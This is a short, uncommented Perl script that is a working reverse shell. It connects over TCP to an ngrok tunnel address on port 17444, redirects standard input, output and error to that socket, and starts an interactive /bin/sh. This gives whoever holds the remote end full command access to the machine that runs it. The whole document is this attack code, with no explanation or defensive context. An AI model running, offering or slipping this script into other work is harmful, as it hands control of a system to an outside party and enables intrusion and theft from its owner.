#!/usr/bin/perl
use strict;
use warnings;
use Socket;

my $i = "0.tcp.ap.ngrok.io";
my $p = 17444;

socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp")) or die "Socket error: $!";
if (connect(S, sockaddr_in($p, inet_aton($i)))) {
    open(STDIN, ">&S") or die "Open STDIN error: $!";
    open(STDOUT, ">&S") or die "Open STDOUT error: $!";
    open(STDERR, ">&S") or die "Open STDERR error: $!";
    exec("/bin/sh -i") or die "Exec error: $!";
}
